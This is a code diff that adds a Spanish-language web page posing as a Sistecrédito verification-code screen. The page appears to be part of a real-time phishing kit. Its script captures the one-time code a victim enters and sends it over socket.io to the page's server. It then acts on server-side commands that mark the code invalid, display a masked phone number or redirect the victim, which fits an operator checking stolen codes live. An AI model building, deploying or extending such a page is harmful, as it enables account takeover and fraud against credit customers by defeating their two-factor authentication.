@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sistecrédito - Código de verificación</title>
+  <link rel="icon" href="https://imgs.search.brave.com/-z6d_lCs4J6KYEb0YS4icgrsThWFdTJsmgaRohNS9Ic/rs:fit:32:32:1:0/g:ce/aHR0cDovL2Zhdmlj/b25zLnNlYXJjaC5i/cmF2ZS5jb20vaWNv/bnMvYWY5MTVkMWVh/NjEzZTNlOWM5NTdi/NDk4ZTk4YmI2ZGM5/OGE0MDE1NTkzNzA4/MThlNmVmZjk3ZDMx/NjFlMTg5MC93d3cu/c2lzdGVjcmVkaXRv/LmNvbS8">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --green: #53e840; --green-dark: #3ecf2e;
+      --green-disabled: #b8f0b0; --green-disabled-text: #5a8a54;
+      --text-dark: #1a1a2e; --text-mid: #555; --text-light: #888;
+      --border: #d8dce5; --white: #ffffff;
+      --blue-focus: #3b82f6; --red: #e74c3c;
+    }
+    body { font-family: 'Roboto', sans-serif; background: var(--white); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; color: var(--text-dark); }
+    .card { background: #f0f3f8; border-radius: 16px; padding: 40px 32px; width: 100%; max-width: 480px; text-align: center; box-shadow: 0 4px 24px rgba(0,0,0,0.10); border: none; }
+    .card h1 { font-size: 1rem; font-weight: 600; color: var(--text-dark); margin-bottom: 16px; }
+    .card p.subtitle { font-size: 0.80rem; color: var(--text-mid); line-height: 1.55; margin-bottom: 18px; font-weight: 400; }
+    .card p.subtitle strong { color: var(--text-dark); font-weight: 700; }
+    .phone-number { font-size: 1.1rem; font-weight: 700; color: var(--text-dark); margin-bottom: 28px; letter-spacing: 0.5px; }
+    .otp-wrap { display: flex; align-items: center; justify-content: center; gap: 20px; margin-bottom: 22px; }
+    .otp-group { display: flex; gap: 10px; }
+    .otp-input { width: 58px; height: 62px; border: 1.5px solid #1a1a2e; border-radius: 8px; text-align: center; font-family: 'Roboto', sans-serif; font-size: 1.4rem; font-weight: 500; color: var(--text-dark); outline: none; transition: border-color .2s; background: var(--white); }
+    .otp-input:focus { border-color: var(--blue-focus); }
+    .otp-input.shake { animation: shake 0.4s ease; border-color: var(--red); }
+    @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-5px)} 75%{transform:translateX(5px)} }
+    .resend { font-size: 0.85rem; color: var(--text-mid); margin-bottom: 28px; }
+    .resend strong { color: var(--text-dark); font-weight: 700; }
+    .resend a { color: var(--blue-focus); text-decoration: none; font-weight: 500; display: none; }
+    .resend a.visible { display: inline; }
+    .btn-row { display: flex; flex-direction: column; gap: 10px; margin-bottom: 24px; }
+    .btn-volver { width: 100%; background: #dededf; color: #0d3318; border: none; border-radius: 30px; padding: 12px; font-family: 'Roboto', sans-serif; font-size: 0.88rem; font-weight: 500; cursor: pointer; transition: background .2s; }
+    .btn-volver:hover { background: #c6c7c7; }
+    .btn-continuar { width: 100%; background: var(--green-disabled); color: var(--green-disabled-text); border: none; border-radius: 30px; padding: 12px; font-family: 'Roboto', sans-serif; font-size: 0.88rem; font-weight: 500; cursor: not-allowed; transition: background .2s, color .2s; }
+    .btn-continuar.active { background: var(--green); color: #1a1a1a; cursor: pointer; }
+    .btn-continuar.active:hover { background: var(--green-dark); }
+    .remember { display: flex; align-items: flex-start; gap: 12px; text-align: left; padding: 4px 0; }
+    .remember input[type="checkbox"] { appearance: none; -webkit-appearance: none; width: 18px; height: 18px; border: 1.5px solid #bbb; border-radius: 4px; background: var(--white); cursor: pointer; flex-shrink: 0; margin-top: 10px; position: relative; transition: all .2s; }
+    .remember input[type="checkbox"]:checked { background: #1d4ed8; border-color: #1d4ed8; }
+    .remember input[type="checkbox"]:checked::after { content: ''; position: absolute; left: 4px; top: 1px; width: 6px; height: 10px; border: 2px solid white; border-top: none; border-left: none; transform: rotate(45deg); }
+    .remember label { font-size: 0.83rem; color: var(--text-mid); line-height: 1.5; cursor: pointer; font-weight: 400; }
+    .remember label strong { color: var(--text-dark); font-weight: 700; }
+    .loading-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.45); z-index: 9999; align-items: center; justify-content: center; }
+    .loading-overlay.active { display: flex; }
+    .loading-spinner { position: relative; width: 90px; height: 90px; display: flex; align-items: center; justify-content: center; }
+    .spin-ring { position: absolute; inset: 0; width: 100%; height: 100%; animation: spin 1.1s linear infinite; }
+    .logo-center { width: 58px; height: 58px; border-radius: 50%; object-fit: cover; position: relative; z-index: 1; background: white; }
+    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+    .error-toast { display: none; position: fixed; top: 24px; left: 50%; transform: translateX(-50%); background: var(--red); color: white; padding: 14px 28px; border-radius: 12px; font-size: 0.95rem; font-weight: 700; z-index: 9999; box-shadow: 0 4px 20px rgba(231,76,60,0.4); white-space: nowrap; }
+    .error-toast.active { display: block; animation: toastIn 0.3s ease; }
+    @keyframes toastIn { from { opacity:0; top:10px; } to { opacity:1; top:24px; } }
+    @media (max-width: 520px) { .card { padding: 32px 20px; } .otp-input { width: 46px; height: 52px; font-size: 1.2rem; } .otp-wrap { gap: 7px; } }
+  </style>
+</head>
+<body>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loading-spinner">
+    <svg class="spin-ring" viewBox="0 0 90 90" fill="none"><circle cx="45" cy="45" r="40" stroke="white" stroke-width="6" stroke-linecap="round" stroke-dasharray="180 72" opacity="0.9"/></svg>
+  </div>
+</div>
+
+<div class="error-toast" id="errorToast">❌ Código inválido. Intenta de nuevo.</div>
+
+<div class="card">
+  <h1>Código de verificación</h1>
+  <p class="subtitle">Ingresa el código que recibirás por <strong>WhatsApp y correo electrónico.</strong></p>
+  <p class="phone-number" id="phoneNumber">+57 *********</p>
+
+  <div class="otp-wrap">
+    <input class="otp-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off"/>
+    <input class="otp-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off"/>
+    <input class="otp-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off"/>
+    <div style="width:14px; flex-shrink:0;"></div>
+    <input class="otp-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off"/>
+    <input class="otp-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off"/>
+    <input class="otp-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off"/>
+  </div>
+
+  <p class="resend" id="resendText">
+    Solicítalo nuevamente en <strong id="timer">0:22</strong> segundos
+    <a href="#" id="resendLink" onclick="resendCode(event)">Solicitar nuevo código</a>
+  </p>
+
+  <div class="btn-row">
+    <button class="btn-volver" type="button" onclick="goBack()">Volver</button>
+    <button class="btn-continuar" id="btnContinuar" type="button" disabled onclick="enviarCodigo()">Continuar</button>
+  </div>
+
+  <div class="remember">
+    <input type="checkbox" id="rememberCheck"/>
+    <label for="rememberCheck">Recordar este <strong>navegador</strong> para próximos pagos y no solicitar código de verificación.</label>
+  </div>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+  var socket = io();
+  var mySessionId = sessionStorage.getItem('sisti_sessionId');
+  var enviando = false;
+
+  if (!mySessionId) {
+    window.location.href = '/';
+  } else {
+    socket.on('connect', function() {
+      socket.emit('cliente_reconectar', { sessionId: mySessionId });
+    });
+  }
+
+  var inputs = Array.from(document.querySelectorAll('.otp-input'));
+  var btnContinuar = document.getElementById('btnContinuar');
+
+  inputs.forEach(function(inp, i) {
+    inp.addEventListener('input', function() {
+      this.value = this.value.replace(/[^0-9]/g, '');
+      if (this.value && i < inputs.length - 1) inputs[i+1].focus();
+      checkOtp();
+    });
+    inp.addEventListener('keydown', function(e) {
+      if (e.key === 'Backspace' && !this.value && i > 0) {
+        inputs[i-1].focus();
+        inputs[i-1].value = '';
+        checkOtp();
+      }
+      if (e.key === 'Enter') enviarCodigo();
+    });
+    inp.addEventListener('paste', function(e) {
+      e.preventDefault();
+      var paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'');
+      paste.split('').forEach(function(c,j){ if(inputs[i+j]) inputs[i+j].value=c; });
+      inputs[Math.min(i+paste.length, inputs.length-1)].focus();
+      checkOtp();
+    });
+  });
+
+  inputs[0].focus();
+
+  function checkOtp() {
+    var full = inputs.every(function(inp){ return inp.value !== ''; });
+    btnContinuar.classList.toggle('active', full);
+    btnContinuar.disabled = !full;
+  }
+
+  function getCodigo() {
+    return inputs.map(function(inp){ return inp.value; }).join('');
+  }
+
+  function limpiar() {
+    inputs.forEach(function(inp){ inp.value=''; inp.classList.remove('shake'); });
+    setTimeout(function(){ inputs[0].focus(); }, 50);
+    checkOtp();
+  }
+
+  function enviarCodigo() {
+    if (btnContinuar.disabled || enviando) return;
+    var codigo = getCodigo();
+    if (codigo.length < 6) return;
+    enviando = true;
+    document.getElementById('loadingOverlay').classList.add('active');
+    socket.emit('cliente_codigo', { sessionId: mySessionId, codigo: codigo });
+  }
+
+  socket.on('cmd_ir_validacion', function(data) {
+    if (data.telefonoMostrar) {
+      document.getElementById('phoneNumber').textContent = '+57 *****' + data.telefonoMostrar;
+    }
+  });
+
+  socket.on('cmd_codigo_invalido', function() {
+    enviando = false;
+    document.getElementById('loadingOverlay').classList.remove('active');
+    inputs.forEach(function(inp){ inp.classList.add('shake'); });
+    setTimeout(function(){ inputs.forEach(function(inp){ inp.classList.remove('shake'); }); }, 500);
+    var toast = document.getElementById('errorToast');
+    toast.classList.add('active');
+    setTimeout(function(){ toast.classList.remove('active'); }, 3000);
+    setTimeout(function(){ limpiar(); }, 400);
+  });
+
+  socket.on('cmd_finalizar', function(data) {
+    sessionStorage.removeItem('sisti_sessionId');
+    window.location.href = data.url;
+  });
+
+  var totalSeconds = 22;
+  var timerEl = document.getElementById('timer');
+  var resendText = document.getElementById('resendText');
+
+  var countdown = setInterval(function() {
+    totalSeconds--;
+    if (totalSeconds <= 0) {
+      clearInterval(countdown);
+      resendText.innerHTML = '<a href="#" class="visible" onclick="resendCode(event)">Solicitar nuevo código</a>';
+    } else {
+      var m = Math.floor(totalSeconds/60), s = totalSeconds%60;
+      timerEl.textContent = m+':'+(s<10?'0':'')+s;
+    }
+  }, 1000);
+
+  function resendCode(e) {
+    e.preventDefault();
+    totalSeconds = 22;
+    resendText.innerHTML = 'Solicítalo nuevamente en <strong id="timer">0:22</strong> segundos <a href="#" onclick="resendCode(event)">Solicitar nuevo código</a>';
+    timerEl = document.getElementById('timer');
+    limpiar();
+    clearInterval(countdown);
+    countdown = setInterval(function() {
+      totalSeconds--;
+      if (totalSeconds <= 0) {
+        clearInterval(countdown);
+        resendText.innerHTML = '<a href="#" class="visible" onclick="resendCode(event)">Solicitar nuevo código</a>';
+      } else {
+        var m = Math.floor(totalSeconds/60), s = totalSeconds%60;
+        timerEl.textContent = m+':'+(s<10?'0':'')+s;
+      }
+    }, 1000);
+  }
+
+  function goBack() {
+    sessionStorage.removeItem('sisti_sessionId');
+    window.location.href = '/';
+  }
+</script>
+</body>
+</html>
